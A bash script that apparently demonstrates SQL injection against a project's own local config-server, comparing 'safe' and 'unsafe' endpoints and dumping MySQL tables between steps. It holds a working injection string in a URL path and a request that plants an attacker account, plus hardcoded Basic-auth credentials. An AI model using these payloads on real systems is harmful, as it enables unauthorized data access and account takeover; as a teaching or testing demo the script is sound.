#!/bin/bash

set -e

if [ $# -lt 1 ]; then
    echo "Usage: $0 <build_dir>"
    exit 1
fi

if [[ "$1" == "--help" ]]; then
    echo "Usage: $0 <build_dir>"
    echo
    echo "Runs a demonstration of SQL injection attacks against the config-server."
    echo
    echo "Arguments:"
    echo "  <build_dir>   Path to the build directory containing config-server and config.ini"
    echo
    exit 0
fi

BUILD_DIR="$1"
# Remove trailing slash from BUILD_DIR if present
BUILD_DIR="${BUILD_DIR%/}"

CONFIG_SERVER_BIN="$BUILD_DIR/config-server/bin/server"
if [ ! -f "$CONFIG_SERVER_BIN" ]; then
    echo "Error: Server binary not found at $CONFIG_SERVER_BIN"
    exit 1
fi

CONFIG_SERVER_INI="$BUILD_DIR/config-server/bin/config.ini"
if [ ! -f "$CONFIG_SERVER_INI" ]; then
    echo "Error: Config file not found at $CONFIG_SERVER_INI"
    exit 1
fi

REALTIME_SERVER_BIN="$BUILD_DIR/realtime-server/bin/server"
if [ ! -f "$REALTIME_SERVER_BIN" ]; then
    echo "Error: Realtime server binary not found at $REALTIME_SERVER_BIN"
    exit 1
fi

# Extract only the [mysql] section
MYSQL_SECTION=$(awk '/^\[mysql\]/ {flag=1; next} /^\[/ {flag=0} flag' "$CONFIG_SERVER_INI")
if [ -z "$MYSQL_SECTION" ]; then
    echo "Error: [mysql] section not found in $CONFIG_SERVER_INI"
    exit 1
fi

MYSQL_HOST=$(echo "$MYSQL_SECTION" | awk -F' *= *' '/^host/ {print $2}')
MYSQL_PORT=$(echo "$MYSQL_SECTION" | awk -F' *= *' '/^port/ {print $2}')
MYSQL_USER=$(echo "$MYSQL_SECTION" | awk -F' *= *' '/^username/ {print $2}')
MYSQL_PASS=$(echo "$MYSQL_SECTION" | awk -F' *= *' '/^password/ {print $2}')
MYSQL_DB=$(echo "$MYSQL_SECTION" | awk -F' *= *' '/^database/ {print $2}')

run_curl() {
    local CURL_CMD="$1"
    echo "> $CURL_CMD"
    echo
    eval "$CURL_CMD"
    echo
}

echo "Starting config-server..."
"$CONFIG_SERVER_BIN" &
CONFIG_SERVER_PID=$!
sleep 1

echo "Printing all contents of 'users' table:"
mysql -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" -e "SELECT * FROM users;"
echo

echo "Printing all contents of 'pairs' table:"
mysql -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" -e "SELECT * FROM pairs;"
echo

echo "Starting realtime-server in order to populate the flights table..."
"$REALTIME_SERVER_BIN" &
REALTIME_SERVER_PID=$!
sleep 1

echo "Stopping realtime-server..."
kill $REALTIME_SERVER_PID
wait $REALTIME_SERVER_PID 2>/dev/null || true
echo "Done."

echo "Printing all contents of 'flights' table:"
mysql -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" -e "SELECT * FROM flights;"

echo "Sending GET request to /config/pairs/safe/SOF-LON with authorized (Manager) user:"
CURL_GET_PAIR_REQUEST="curl -k -X GET https://localhost:8080/config/pairs/safe/SOF-LON -H \"Content-Type: application/json\" -H \"Authorization: Basic U3VwZXJBZG1pbjE6NHN0cm9uZ19QYXNzd29yZDQ=\""
run_curl "$CURL_GET_PAIR_REQUEST"

echo "Sending same request, but with unauthorized (External) user:"
CURL_GET_PAIR_REQUEST="curl -k -X GET https://localhost:8080/config/pairs/safe/SOF-LON -H \"Content-Type: application/json\" -H \"Authorization: Basic QWlyQmFsdGljOnBhc3N3b3JkMQ==\""
run_curl "$CURL_GET_PAIR_REQUEST"

echo "Sending GET request to /config/pairs/unsafe/ with injected SQL in the resource path tricks the server into returning all pairs:"
CURL_ATTACKER_GET_PAIRS_REQUEST="curl -k -X GET https://localhost:8080/config/pairs/unsafe/SOF-LON%27%20OR%20%27%27=%27 -H \"Content-Type: application/json\" -H \"Authorization: Basic U3VwZXJBZG1pbjE6NHN0cm9uZ19QYXNzd29yZDQ=\""
run_curl "$CURL_ATTACKER_GET_PAIRS_REQUEST"

echo "Sending valid POST request to /config/users/safe with authorized (Manager) user:"
CURL_POST_USER_REQUEST="curl -k -X POST https://localhost:8080/config/users/safe -H \"Content-Type: application/json\" -H \"Authorization: Basic U3VwZXJBZG1pbjE6NHN0cm9uZ19QYXNzd29yZDQ=\" -d @$BUILD_DIR/config-server/requests/insert-user-valid-request.json"
run_curl "$CURL_POST_USER_REQUEST"

echo "Printing all contents of 'users' table:"
mysql -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" -e "SELECT * FROM users;"
echo

echo "Sending invalid POST request to the same resource with the same user:"
CURL_POST_USER_REQUEST="curl -k -X POST https://localhost:8080/config/users/safe -H \"Content-Type: application/json\" -H \"Authorization: Basic U3VwZXJBZG1pbjE6NHN0cm9uZ19QYXNzd29yZDQ=\" -d @$BUILD_DIR/config-server/requests/insert-user-invalid-request.json"
run_curl "$CURL_POST_USER_REQUEST"

echo "Printing all contents of 'users' table:"
mysql -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" -e "SELECT * FROM users;"
echo

echo "Sending POST request to /config/users/unsafe with injected SQL in the request body:"
CURL_ATTACKER_POST_USER_REQUEST="curl -k -X POST https://localhost:8080/config/users/unsafe -H \"Content-Type: application/json\" -H \"Authorization: Basic U3VwZXJBZG1pbjE6NHN0cm9uZ19QYXNzd29yZDQ=\" -d @$BUILD_DIR/config-server/requests/attacker-insert-user-request.json"
run_curl "$CURL_ATTACKER_POST_USER_REQUEST"

echo "Printing all contents of 'users' table:"
mysql -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" -e "SELECT * FROM users;"
echo

ATTACKER_B64=$(./base64-encode-users.sh | awk '/attacker/ {print $3}')

echo "Sending POST request to /config/pairs/safe with the attacker's user:"
CURL_ATTACKER_POST_PAIR_REQUEST="curl -k -X POST https://localhost:8080/config/pairs/safe -H \"Content-Type: application/json\" -H \"Authorization: Basic $ATTACKER_B64\" -d @$BUILD_DIR/config-server/requests/insert-pair-valid-request.json"
run_curl "$CURL_ATTACKER_POST_PAIR_REQUEST"

echo "Stopping config-server (PID $CONFIG_SERVER_PID)..."
kill $CONFIG_SERVER_PID
wait $CONFIG_SERVER_PID 2>/dev/null || true
echo "Done."

echo "Printing all contents of 'pairs' table:"
mysql -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" -e "SELECT * FROM pairs;"

echo "Starting realtime-server in order to re-populate the flights table..."
"$REALTIME_SERVER_BIN" &
REALTIME_SERVER_PID=$!
sleep 1

echo "Printing all contents of 'flights' table:"
mysql -h "$MYSQL_HOST" -P "$MYSQL_PORT" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" -e "SELECT * FROM flights;"

echo "Stopping realtime-server..."
kill $REALTIME_SERVER_PID
wait $REALTIME_SERVER_PID 2>/dev/null || true
echo "Done."

echo "End of demonstration. NOTE: The original state of the MySQL database has been altered, consider running the mysql-setup.sh script to restore it before running the demonstration again."